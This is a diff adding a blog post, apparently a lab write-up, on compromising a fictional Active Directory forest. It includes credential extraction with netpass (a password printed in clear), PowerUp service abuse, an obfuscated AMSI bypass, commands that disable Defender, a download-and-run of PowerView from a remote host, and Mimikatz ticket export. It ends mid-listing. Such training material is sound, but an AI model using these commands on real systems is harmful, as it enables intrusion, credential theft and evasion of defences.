@@ -1,0 +1,581 @@
+<!DOCTYPE html>
+<html lang="en-us">
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+
+    <meta http-equiv="cache-control" content="max-age=0" />
+    <meta http-equiv="cache-control" content="no-cache" />
+    <meta http-equiv="expires" content="0" />
+    <meta http-equiv="expires" content="Tue, 01 Jan 1980 1:00:00 GMT" />
+    <meta http-equiv="pragma" content="no-cache" />
+
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+    <link rel="manifest" href="/site.webmanifest">
+
+    <meta name="theme-color" media="(prefers-color-scheme: light)" content="#ffffff" />
+    <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#000000" />
+
+    <meta name="description" content="cosmos, part 2: domain &#43; forest compromise">
+
+    
+        <title>cosmos, part 2: domain &#43; forest compromise | ༧</title>
+    
+
+    
+    <link rel="stylesheet" type="text/css" href="/style.min.50e5dce6bdbdda9c021bb01730b34c1639e90db55e0fd1ed0f37771832d1ce47.css" media="all">
+  </head>
+
+  <body>
+        
+        <nav>
+          <ul class="menu">
+            
+                <li><a tabindex="-1" class="menu-link" href="/about/">about</a></li>
+            
+                <li><a tabindex="-1" class="menu-link" href="/cv/">cv</a></li>
+            
+                <li><a tabindex="-1" class="menu-link" href="/posts/">posts</a></li>
+            
+                <li><a tabindex="-1" class="menu-link" href="/photography/">photography</a></li>
+            
+          </ul>
+        </nav>
+        
+
+
+
+<div id="single-header">
+  <h1>
+    cosmos, part 2: domain + forest compromise
+  </h1>
+  <div id="single-meta">
+    
+    
+        <span class="datesub">jan 27, 2024</span>
+      
+
+  </div>
+</div>
+
+
+<div class="content-container">
+  
+  <aside class="toc" id="tableOfContentContainer">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#target-4">target 4</a>
+      <ul>
+        <li><a href="#scheduled-task-exploitation">scheduled task exploitation</a></li>
+        <li><a href="#extracting-credentials">extracting credentials</a></li>
+        <li><a href="#powerup"><code>PowerUp</code></a></li>
+      </ul>
+    </li>
+    <li><a href="#target-5">target 5</a>
+      <ul>
+        <li><a href="#unconstrained-delegation">unconstrained delegation</a></li>
+        <li><a href="#injecting-ticket-into-lsass">injecting ticket into LSASS</a></li>
+      </ul>
+    </li>
+    <li><a href="#target-6">target 6</a>
+      <ul>
+        <li><a href="#forest-domination">forest domination</a></li>
+        <li><a href="#dumping-the-hash">dumping the hash</a></li>
+        <li><a href="#forging-the-inter-realm-tgt">forging the inter-realm TGT</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+  </aside>
+  
+
+  <main><p>in part 1, i covered the first act of the post-exploitation phase, pivoting from the user workstation to the UAT server and then the dev server. in this part, i&rsquo;ll use the privileges gleaned from the dev server to pivot to the production server, the child domain controller, and, finally, the forest root domain controller.</p>
+<h2 id="target-4">target 4</h2>
+<p>the production server <code>prodsrv.nebula.cosmos.local</code>, contains arguably the most valuable data for an operation. it hosts live applications, which could be an e-commerce platform, CRM system, or another business-critical app.</p>
+<p>while security is tighter here, production environments can still fall victim to misconfigurations. hence, i&rsquo;m going to chain together multiple vulnerabilities, from scheduled task abuse to service exploitation.</p>
+<h3 id="scheduled-task-exploitation">scheduled task exploitation</h3>
+<p>during the enumeration phase, i discovered that the <code>devmanager</code> user account was associated with scheduled tasks.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>PS C:<span style="color:#f1fa8c">\A</span>D<span style="color:#f1fa8c">\t</span>ools&gt; . .<span style="color:#f1fa8c">\P</span>owerview.ps1
+</span></span><span style="display:flex;"><span>PS C:<span style="color:#f1fa8c">\A</span>D<span style="color:#f1fa8c">\t</span>ools&gt; Get-NetUser | Select-Object userprincipalname,description | ft -wrap
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>userprincipalname             description
+</span></span><span style="display:flex;"><span>-----------------             -----------
+</span></span><span style="display:flex;"><span>                              Built-in account <span style="color:#ff79c6">for</span> administering the computer/domain
+</span></span><span style="display:flex;"><span>                              Built-in account <span style="color:#ff79c6">for</span> guest access to the computer/domain
+</span></span><span style="display:flex;"><span>                              A user account managed by the system
+</span></span><span style="display:flex;"><span>                              Key Distribution Center Service Account
+</span></span><span style="display:flex;"><span>data@nebula.cosmos.local
+</span></span><span style="display:flex;"><span>reportuser
+</span></span><span style="display:flex;"><span>devsqladmin
+</span></span><span style="display:flex;"><span>uatadmin
+</span></span><span style="display:flex;"><span>prodadmin
+</span></span><span style="display:flex;"><span>serviceacct
+</span></span><span style="display:flex;"><span>employeeuser
+</span></span><span style="display:flex;"><span>devmanager                    Please use this <span style="color:#ff79c6">for</span> running scheduled tasks
+</span></span></code></pre></div><p>upon accessing the <code>Devsrv.nebula.cosmos.local</code> machine as <code>employeeuser</code>, i navigated to <code>C:\Windows\system32\Tasks</code> and found a <code>SQLServerChecker</code> task. to exploit this, i executed the following:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>Schtasks /RUN /TN <span style="color:#f1fa8c">&#34;SQLServerChecker&#34;</span>
+</span></span></code></pre></div><h3 id="extracting-credentials">extracting credentials</h3>
+<p>extracting credentials from scheduled tasks is possible because Credential Manager stores the credentials on disk and protected by DPAPI. a program running as that specific user will be able to access credentials in this store.</p>
+<p>using <code>PSExec</code> to run <code>netpass</code>, it&rsquo;s possible to retrieve the saved passwords. in this case, it&rsquo;s possible to extract the credentials for the <code>devmanager</code> account.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>.<span style="color:#f1fa8c">\P</span>SExec64.exe -i -s -d C:<span style="color:#f1fa8c">\W</span>indows<span style="color:#f1fa8c">\s</span>ystem32<span style="color:#f1fa8c">\T</span>asks<span style="color:#f1fa8c">\n</span>etpass.exe
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>PsExec could not start C:<span style="color:#f1fa8c">\W</span>indows<span style="color:#f1fa8c">\S</span>ystem32<span style="color:#f1fa8c">\T</span>asks<span style="color:#f1fa8c">\n</span>etpass.exe on DEVSRV:
+</span></span><span style="display:flex;"><span>The system cannot find the file specified.
+</span></span><span style="display:flex;"><span>PS C:<span style="color:#f1fa8c">\W</span>indows<span style="color:#f1fa8c">\s</span>ystem32<span style="color:#f1fa8c">\T</span>asks&gt; ls
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    Directory: C:<span style="color:#f1fa8c">\W</span>indows<span style="color:#f1fa8c">\s</span>ystem32<span style="color:#f1fa8c">\T</span>asks
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Mode         LastWriteTime         Length Name
+</span></span><span style="display:flex;"><span>----         -------------         ------ ----
+</span></span><span style="display:flex;"><span>d-----       1/24/2024   9:33 PM          Microsoft
+</span></span><span style="display:flex;"><span>-a----       5/18/2024   5:29 AM    <span style="color:#bd93f9">2530060</span> Invoke-Mimikatz.ps1
+</span></span><span style="display:flex;"><span>-a----       4/14/2024   2:22 AM     <span style="color:#bd93f9">138752</span> netpass.exe
+</span></span><span style="display:flex;"><span>------       5/25/2024   4:40 PM    <span style="color:#bd93f9">1078672</span> PsExec64.exe
+</span></span><span style="display:flex;"><span>-a----      10/22/2023   4:41 AM       <span style="color:#bd93f9">3518</span> SQLServerChecker
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PS C:<span style="color:#f1fa8c">\W</span>indows<span style="color:#f1fa8c">\s</span>ystem32<span style="color:#f1fa8c">\T</span>asks&gt; .<span style="color:#f1fa8c">\P</span>sExec64.exe -i -s -d <span style="color:#f1fa8c">&#39;C:\Windows\System32\Tasks\netpass.exe&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PsExec v2.34 - Execute processes remotely
+</span></span><span style="display:flex;"><span>Copyright <span style="color:#ff79c6">(</span>C<span style="color:#ff79c6">)</span> 2001-2024 Mark Russinovich
+</span></span><span style="display:flex;"><span>Sysinternals - www.sysinternals.com
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>C:<span style="color:#f1fa8c">\W</span>indows<span style="color:#f1fa8c">\S</span>ystem32<span style="color:#f1fa8c">\T</span>asks<span style="color:#f1fa8c">\n</span>etpass.exe started on DEVSRV with process ID 4872.
+</span></span><span style="display:flex;"><span>PS C:<span style="color:#f1fa8c">\W</span>indows<span style="color:#f1fa8c">\s</span>ystem32<span style="color:#f1fa8c">\T</span>asks&gt;
+</span></span></code></pre></div><p>a <code>netpass</code> window opens up and reveals the credentials:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>NEBULA<span style="color:#f1fa8c">\d</span>evmanager:F0rRunning<span style="color:#8be9fd;font-style:italic">$cheduledTasks</span>!
+</span></span></code></pre></div><h3 id="powerup"><code>PowerUp</code></h3>
+<p>after gaining access via RDP to <code>Prodsrv.Nebula.Cosmos.local</code> as <code>devmanager</code>, i found that this account lacked local admin rights. privileges can be elevated by using <code>PowerUp</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>.<span style="color:#f1fa8c">\p</span>owerup.ps1
+</span></span><span style="display:flex;"><span>Invoke-AllChecks
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>PS C:<span style="color:#f1fa8c">\U</span>sers<span style="color:#f1fa8c">\d</span>evmanager&gt; <span style="color:#8be9fd;font-style:italic">cd</span> .<span style="color:#f1fa8c">\D</span>esktop
+</span></span><span style="display:flex;"><span>PS C:<span style="color:#f1fa8c">\U</span>sers<span style="color:#f1fa8c">\d</span>evmanager<span style="color:#f1fa8c">\D</span>esktop&gt; ls
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    Directory: C:<span style="color:#f1fa8c">\U</span>sers<span style="color:#f1fa8c">\d</span>evmanager<span style="color:#f1fa8c">\D</span>esktop
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Mode         LastWriteTime         Length Name
+</span></span><span style="display:flex;"><span>----         -------------         ------ ----
+</span></span><span style="display:flex;"><span>-a----       6/23/2024   7:45 AM    <span style="color:#bd93f9">562841</span> PowerUp.ps1
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PS C:<span style="color:#f1fa8c">\U</span>sers<span style="color:#f1fa8c">\d</span>evmanager<span style="color:#f1fa8c">\D</span>esktop&gt; . .<span style="color:#f1fa8c">\P</span>owerUp.ps1
+</span></span><span style="display:flex;"><span>PS C:<span style="color:#f1fa8c">\U</span>sers<span style="color:#f1fa8c">\d</span>evmanager<span style="color:#f1fa8c">\D</span>esktop&gt; Invoke-AllChecks
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Running Invoke-AllChecks
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Checking <span style="color:#ff79c6">if</span> user is in a <span style="color:#8be9fd;font-style:italic">local</span> group with administrative privileges...
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Checking <span style="color:#ff79c6">for</span> unquoted service paths...
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Checking service executable and argument permissions...
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Checking service permissions...
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ServiceName    : Browser
+</span></span><span style="display:flex;"><span>Path           : C:<span style="color:#f1fa8c">\W</span>indows<span style="color:#f1fa8c">\S</span>ystem32<span style="color:#f1fa8c">\s</span>vchost.exe -k smbsvcs
+</span></span><span style="display:flex;"><span>StartName      : LocalSystem
+</span></span><span style="display:flex;"><span>AbuseFunction  : Invoke-ServiceAbuse -Name <span style="color:#f1fa8c">&#39;Browser&#39;</span>
+</span></span><span style="display:flex;"><span>CanRestart     : True
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Checking %PATH% <span style="color:#ff79c6">for</span> potentially hijackable DLL locations...
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ModifiablePath    : C:<span style="color:#f1fa8c">\U</span>sers<span style="color:#f1fa8c">\d</span>evmanager<span style="color:#f1fa8c">\A</span>ppData<span style="color:#f1fa8c">\L</span>ocal<span style="color:#f1fa8c">\M</span>icrosoft<span style="color:#f1fa8c">\W</span>indowsApps
+</span></span><span style="display:flex;"><span>IdentityReference : NEBULA<span style="color:#f1fa8c">\d</span>evmanager
+</span></span><span style="display:flex;"><span>Permissions       : <span style="color:#ff79c6">{</span>WriteOwner, Delete, WriteAttributes, Synchronize...<span style="color:#ff79c6">}</span>
+</span></span><span style="display:flex;"><span>%PATH%            : C:<span style="color:#f1fa8c">\U</span>sers<span style="color:#f1fa8c">\d</span>evmanager<span style="color:#f1fa8c">\A</span>ppData<span style="color:#f1fa8c">\L</span>ocal<span style="color:#f1fa8c">\M</span>icrosoft<span style="color:#f1fa8c">\W</span>indowsApps
+</span></span><span style="display:flex;"><span>AbuseFunction     : Write-HijackDll -DllPath <span style="color:#f1fa8c">&#39;C:\Users\devmanager\AppData\Local\Microsoft\WindowsApps\wlbsctrl.dll&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Checking <span style="color:#ff79c6">for</span> AlwaysInstallElevated registry key...
+</span></span></code></pre></div><p>looks like <code>Browser</code> service permissions can be exploited. this would allow me to modify the <code>binPath</code>, or the path to the service allowing the <code>Browser</code> service to point to an <code>exe</code> of my choosing.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>Invoke-serviceabuse -servicename browser -username nebula<span style="color:#f1fa8c">\d</span>evmanager /add
+</span></span></code></pre></div><p>i then verified my privileges.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>net localgroup Administrators
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>Windows PowerShell
+</span></span><span style="display:flex;"><span>Copyright <span style="color:#ff79c6">(</span>C<span style="color:#ff79c6">)</span> <span style="color:#bd93f9">2016</span> Microsoft Corporation. All rights reserved.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PS C:<span style="color:#f1fa8c">\W</span>indows<span style="color:#f1fa8c">\s</span>ystem32&gt; S<span style="color:#f1fa8c">`</span>eT-It<span style="color:#f1fa8c">`</span>em <span style="color:#ff79c6">(</span> <span style="color:#f1fa8c">&#39;V&#39;</span>+<span style="color:#f1fa8c">&#39;aR&#39;</span> + <span style="color:#f1fa8c">&#39;IA&#39;</span> + <span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#39;b&#39;</span>+<span style="color:#f1fa8c">&#39;lE:1&#39;</span>+<span style="color:#f1fa8c">&#39;q2&#39;</span><span style="color:#ff79c6">)</span> + <span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#39;uZ&#39;</span>+<span style="color:#f1fa8c">&#39;x&#39;</span><span style="color:#ff79c6">)</span> <span style="color:#ff79c6">)</span> <span style="color:#ff79c6">(</span> <span style="color:#ff79c6">[</span>TYpE<span style="color:#ff79c6">](</span><span style="color:#f1fa8c">&#34;{1}{0}&#34;</span>-F<span style="color:#f1fa8c">&#39;F&#39;</span>,<span style="color:#f1fa8c">&#39;rE&#39;</span><span style="color:#ff79c6">)</span> <span style="color:#ff79c6">)</span> ; <span style="color:#ff79c6">(</span> GeT-VariaBle <span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;1Q2U&#34;</span>+<span style="color:#f1fa8c">&#34;zX&#34;</span><span style="color:#ff79c6">)</span> -VaL <span style="color:#ff79c6">)</span>.<span style="color:#f1fa8c">&#34;A`ss`Embly&#34;</span>.<span style="color:#f1fa8c">&#34;GET`TY`Pe&#34;</span><span style="color:#ff79c6">((</span> <span style="color:#f1fa8c">&#34;{6}{3}{1}{4}{2}{0}{5}&#34;</span> -f<span style="color:#f1fa8c">&#39;Util&#39;</span>,<span style="color:#f1fa8c">&#39;A&#39;</span>,<span style="color:#f1fa8c">&#39;Amsi&#39;</span>,<span style="color:#f1fa8c">&#39;.Management.&#39;</span>,<span style="color:#f1fa8c">&#39;utomation.&#39;</span>,<span style="color:#f1fa8c">&#39;s&#39;</span>,<span style="color:#f1fa8c">&#39;System&#39;</span> <span style="color:#ff79c6">)</span> <span style="color:#ff79c6">)</span>.<span style="color:#f1fa8c">&#34;g`etf`iElD&#34;</span><span style="color:#ff79c6">(</span> <span style="color:#ff79c6">(</span> <span style="color:#f1fa8c">&#34;{0}{2}{1}&#34;</span> -f<span style="color:#f1fa8c">&#39;amsi&#39;</span>,<span style="color:#f1fa8c">&#39;d&#39;</span>,<span style="color:#f1fa8c">&#39;InitFaile&#39;</span> <span style="color:#ff79c6">)</span>,<span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;{2}{4}{0}{1}{3}&#34;</span> -f <span style="color:#f1fa8c">&#39;Stat&#39;</span>,<span style="color:#f1fa8c">&#39;i&#39;</span>,<span style="color:#f1fa8c">&#39;NonPubli&#39;</span>,<span style="color:#f1fa8c">&#39;c&#39;</span>,<span style="color:#f1fa8c">&#39;c,&#39;</span> <span style="color:#ff79c6">))</span>.<span style="color:#f1fa8c">&#34;sE`T`VaLUE&#34;</span><span style="color:#ff79c6">(</span> <span style="color:#f1fa8c">${</span><span style="color:#8be9fd;font-style:italic">n</span><span style="color:#f1fa8c">`</span>ULl<span style="color:#ff79c6">}</span>,<span style="color:#f1fa8c">${</span><span style="color:#8be9fd;font-style:italic">t</span><span style="color:#f1fa8c">`</span>RuE<span style="color:#ff79c6">}</span> <span style="color:#ff79c6">)</span>
+</span></span><span style="display:flex;"><span>PS C:<span style="color:#f1fa8c">\W</span>indows<span style="color:#f1fa8c">\s</span>ystem32&gt; Set-MpPreference -DisableBehaviorMonitoring <span style="color:#8be9fd;font-style:italic">$true</span>
+</span></span><span style="display:flex;"><span>PS C:<span style="color:#f1fa8c">\W</span>indows<span style="color:#f1fa8c">\s</span>ystem32&gt; Set-MpPreference -DisableIOAVProtection <span style="color:#8be9fd;font-style:italic">$true</span>
+</span></span><span style="display:flex;"><span>PS C:<span style="color:#f1fa8c">\W</span>indows<span style="color:#f1fa8c">\s</span>ystem32&gt; net localgroup administrators
+</span></span><span style="display:flex;"><span>Alias name     administrators
+</span></span><span style="display:flex;"><span>Comment        Administrators have <span style="color:#8be9fd;font-style:italic">complete</span> and unrestricted access to the computer/domain
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Members
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>-------------------------------------------------------------------------------
+</span></span><span style="display:flex;"><span>Administrator
+</span></span><span style="display:flex;"><span>NEBULA<span style="color:#f1fa8c">\d</span>evmanager
+</span></span><span style="display:flex;"><span>NEBULA<span style="color:#f1fa8c">\D</span>omain Admins
+</span></span><span style="display:flex;"><span>NEBULA<span style="color:#f1fa8c">\p</span>rodadmin
+</span></span><span style="display:flex;"><span>NEBULA<span style="color:#f1fa8c">\s</span>erviceacct
+</span></span><span style="display:flex;"><span>The <span style="color:#8be9fd;font-style:italic">command</span> completed successfully.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PS C:<span style="color:#f1fa8c">\W</span>indows<span style="color:#f1fa8c">\s</span>ystem32&gt; whoami
+</span></span><span style="display:flex;"><span>nebula<span style="color:#f1fa8c">\d</span>evmanager
+</span></span><span style="display:flex;"><span>PS C:<span style="color:#f1fa8c">\W</span>indows<span style="color:#f1fa8c">\s</span>ystem32&gt;
+</span></span></code></pre></div><p>with local admin rights now applied on the production server, i&rsquo;m now able to push forward to attack the domain controller!</p>
+<h2 id="target-5">target 5</h2>
+<h3 id="unconstrained-delegation">unconstrained delegation</h3>
+<p>using the <code>Get-NetComputer</code> cmdlet, i can list computers with unconstrained delegation enabled.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>Get-NetComputer -unconstrained
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>PS C:<span style="color:#f1fa8c">\W</span>indows<span style="color:#f1fa8c">\s</span>ystem32&gt; iex <span style="color:#ff79c6">(</span>iwr http://172.16.10.1/powerview.ps1 -usebasicparsing<span style="color:#ff79c6">)</span>
+</span></span><span style="display:flex;"><span>PS C:<span style="color:#f1fa8c">\W</span>indows<span style="color:#f1fa8c">\s</span>ystem32&gt; Get-NetComputer -Unconstrained
+</span></span><span style="display:flex;"><span>nebula-dc.nebula.cosmos.local
+</span></span><span style="display:flex;"><span>prodsrv.nebula.cosmos.local
+</span></span></code></pre></div><p>unconstrained delegation allows users to access any services in a domain, meaning i can run <code>mimikatz</code> to export Kerberos tickets from the <code>Prodsrv</code> machine to a different machine.</p>
+<p>first, i&rsquo;ll create a directory that will house the tickets.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>mkdir tickets
+</span></span></code></pre></div><p>then, export the tickets from the <code>lsa</code> process.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>Invoke-Mimikatz –Command <span style="color:#f1fa8c">&#39;&#34;sekurlsa::tickets /export&#34;&#39;</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>PS C:<span style="color:#f1fa8c">\W</span>indows<span style="color:#f1fa8c">\s</span>ystem32&gt; <span style="color:#8be9fd;font-style:italic">cd</span> c:
+</span></span><span style="display:flex;"><span>PS C:<span style="color:#f1fa8c">\W</span>indows<span style="color:#f1fa8c">\s</span>ystem32&gt; <span style="color:#8be9fd;font-style:italic">cd</span> /
+</span></span><span style="display:flex;"><span>PS C:<span style="color:#f1fa8c">\&gt;</span> <span style="color:#8be9fd;font-style:italic">cd</span> C:<span style="color:#f1fa8c">\U</span>sers<span style="color:#f1fa8c">\d</span>evmanager<span style="color:#f1fa8c">\D</span>esktop
+</span></span><span style="display:flex;"><span>PS C:<span style="color:#f1fa8c">\U</span>sers<span style="color:#f1fa8c">\d</span>evmanager<span style="color:#f1fa8c">\D</span>esktop&gt; mkdir tickets
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    Directory: C:<span style="color:#f1fa8c">\U</span>sers<span style="color:#f1fa8c">\d</span>evmanager<span style="color:#f1fa8c">\D</span>esktop
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Mode                LastWriteTime         Length Name
+</span></span><span style="display:flex;"><span>----                -------------         ------ ----
+</span></span><span style="display:flex;"><span>d-----         7/3/2024   2:39 PM                tickets
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PS C:<span style="color:#f1fa8c">\U</span>sers<span style="color:#f1fa8c">\d</span>evmanager<span style="color:#f1fa8c">\D</span>esktop&gt; <span style="color:#8be9fd;font-style:italic">cd</span> .<span style="color:#f1fa8c">\t</span>ickets
+</span></span><span style="display:flex;"><span>PS C:<span style="color:#f1fa8c">\U</span>sers<span style="color:#f1fa8c">\d</span>evmanager<span style="color:#f1fa8c">\D</span>esktop<span style="color:#f1fa8c">\t</span>ickets&gt;
+</span></span><span style="display:flex;"><span>PS C:<span style="color:#f1fa8c">\U</span>sers<span style="color:#f1fa8c">\d</span>evmanager<span style="color:#f1fa8c">\D</span>esktop<span style="color:#f1fa8c">\t</span>ickets&gt; Invoke-Mimikatz -Command <span style="color:#f1fa8c">&#39;&#34;sekurlsa::tickets /export&#34;&#39;</span>
+</span></span></code></pre></div><p>interestingly, there&rsquo;s an <code>Administrator</code> ticket.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>    LastWriteTime         Length Name
+</span></span><span style="display:flex;"><span>    -------------         ------ ----
+</span></span><span style="display:flex;"><span>7/3/2024   2:39 PM          <span style="color:#bd93f9">1641</span> <span style="color:#ff79c6">[</span>0:31da8d<span style="color:#ff79c6">]</span>-2-0-60a10000-Administrator@krbtgt-NEBULA.COSMOS.LOCAL.kirbi
+</span></span><span style="display:flex;"><span>7/3/2024   2:39 PM          <span style="color:#bd93f9">1705</span> <span style="color:#ff79c6">[</span>0:32ca4a<span style="color:#ff79c6">]</span>-0-0-40a50000-devmanager@ldap-nebula-dc.nebula.cosmos.local.kirbi
+</span></span><span style="display:flex;"><span>7/3/2024   2:39 PM          <span style="color:#bd93f9">1751</span> <span style="color:#ff79c6">[</span>0:32ca4a<span style="color:#ff79c6">]</span>-0-1-40a50000-devmanager@LDAP-nebula-dc.nebula.cosmos.local.kirbi
+</span></span><span style="display:flex;"><span>7/3/2024   2:39 PM          <span style="color:#bd93f9">1579</span> <span style="color:#ff79c6">[</span>0:32ca4a<span style="color:#ff79c6">]</span>-2-0-40e10000-devmanager@krbtgt-NEBULA.COSMOS.LOCAL.kirbi
+</span></span><span style="display:flex;"><span>7/3/2024   2:39 PM          <span style="color:#bd93f9">1641</span> <span style="color:#ff79c6">[</span>0:357bef<span style="color:#ff79c6">]</span>-2-0-60a10000-Administrator@krbtgt-NEBULA.COSMOS.LOCAL.kirbi
+</span></span><span style="display:flex;"><span>7/3/2024   2:39 PM          <span style="color:#bd93f9">1709</span> <span style="color:#ff79c6">[</span>0:3e4<span style="color:#ff79c6">]</span>-0-0-40a50000-PRODSRV<span style="color:#8be9fd;font-style:italic">$@</span>cifs-nebula-dc.nebula.cosmos.local.kirbi
+</span></span><span style="display:flex;"><span>7/3/2024   2:39 PM          <span style="color:#bd93f9">1583</span> <span style="color:#ff79c6">[</span>0:3e4<span style="color:#ff79c6">]</span>-2-0-60a10000-PRODSRV<span style="color:#8be9fd;font-style:italic">$@</span>krbtgt-NEBULA.COSMOS.LOCAL.kirbi
+</span></span><span style="display:flex;"><span>7/3/2024   2:39 PM          <span style="color:#bd93f9">1583</span> <span style="color:#ff79c6">[</span>0:3e4<span style="color:#ff79c6">]</span>-2-1-40e10000-PRODSRV<span style="color:#8be9fd;font-style:italic">$@</span>krbtgt-NEBULA.COSMOS.LOCAL.kirbi
+</span></span><span style="display:flex;"><span>7/3/2024   2:39 PM          <span style="color:#bd93f9">1755</span> <span style="color:#ff79c6">[</span>0:3e7<span style="color:#ff79c6">]</span>-0-0-40a50000-PRODSRV<span style="color:#8be9fd;font-style:italic">$@</span>cifs-nebula-dc.nebula.cosmos.local.kirbi
+</span></span><span style="display:flex;"><span>7/3/2024   2:39 PM          <span style="color:#bd93f9">1747</span> <span style="color:#ff79c6">[</span>0:3e7<span style="color:#ff79c6">]</span>-0-1-40a50000.kirbi
+</span></span><span style="display:flex;"><span>7/3/2024   2:39 PM          <span style="color:#bd93f9">1709</span> <span style="color:#ff79c6">[</span>0:3e7<span style="color:#ff79c6">]</span>-0-2-40a50000-PRODSRV<span style="color:#8be9fd;font-style:italic">$@</span>LDAP-nebula-dc.nebula.cosmos.local.kirbi
